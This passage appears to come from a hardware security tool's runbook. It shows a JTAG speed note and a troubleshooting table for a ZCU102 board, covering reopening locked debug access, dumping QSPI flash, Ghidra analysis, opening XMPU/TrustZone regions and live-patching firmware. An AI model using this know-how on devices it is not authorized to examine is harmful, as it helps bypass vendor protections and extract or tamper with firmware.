> Speed: the ZCU102 cfg runs JTAG at **15 MHz** (bench-validated max; `openocd/bench-axi.tcl` re-measures the
> ceiling on any board) and dumps in 16 KB chunks — ~7× faster than the old 1 MHz default.

## Troubleshooting quick-reference

| Symptom | Most likely cause | First move |
|----|----|----|
| No IDCODE / NO-CHAIN | Wiring, Vref, or adapter speed | Re-seat, confirm 1.8 V I/O, lower speed; re-run Phase 0 |
| Verdict RESTRICTED/LOCKED | Production access controls active | Phase 2 `reopen-debug` (+ Tier-1 levers); if eFuse-locked, that's the finding |
| DAP wedges mid-run | A read hit a gated/unmapped region or EL1 core read | JTAG reset / power-cycle; re-confirm `OPEN`; never read through core at EL1 (`reference_dap_wedge`) |
| RDID all 0x00/0xFF | GQSPI MMIO unreachable (gated) or flash not strapped | Phase 2 first; else PIO `QSPI_OP=dump` / UART SD-pull |
| `dmaread` MISMATCH | DMA decode/lead-in issue on this board | Use PIO fallback (`QSPI_OP=dump`); re-run `dmaread` to re-measure |
| FTDI wedged (LIBUSB / MPSSE flush) | Sustained DMA traffic through VMware passthrough | `usbreset` the 0403:6014; use `tools/qspi-dump.sh` (auto-resets); run OpenOCD natively for speed |
| `parse-bootimage` bad magic | Dump not aligned to BH start, or encrypted partition | Check offset; check Phase-1 encrypt/auth posture |
| Ghidra garbage disassembly | Wrong base or compressed/encrypted partition | Try alt base from `ghidra-loadspec`; confirm it's raw code |
| Phys write doesn't read back | AXI-AP blocked for region (XMPU/TrustZone) | Check Required-security-state list; open XMPU for the master |
| Live patch writes DRAM but no behavioral change | Patched a cached `.text` page; the I-cache still serves the old instruction | Use Cap 3 (reflash) for a guaranteed behavioral change — in-place cache flush wedges the DAP here (`project_core_side_dynamic_analysis`) |
| `break-capture` shows x2–x30/sp = 0 | Stale build using `get_reg` (lazily-cached) | Update: `_regval` must use `reg <name>` (forces a fetch) |
| Backtrace frame #02+ looks like garbage | Stack read via AXI = stale cached frame | break-capture now core-reads the stack (coherent); #00/#01 are register-derived and always good |
| Writing JTAG_DAP_CFG=0 → unclearable STICKY ERROR | DAP-side debug-gate harden self-gates your own access | Power-cycle (register state, no eFuses); don't harden the gate that carries your access (`project_phase3_hardening_finding`) |
| `kill -9` openocd → FTDI MPSSE wedged | SIGKILL mid-transaction stuck the chip; in-guest USB resets don't work under VMware | VMware Disconnect/Connect (host-level re-enumerate); use SIGTERM/`timeout`, never -9 (`reference_ftdi_mpsse_wedge`) |
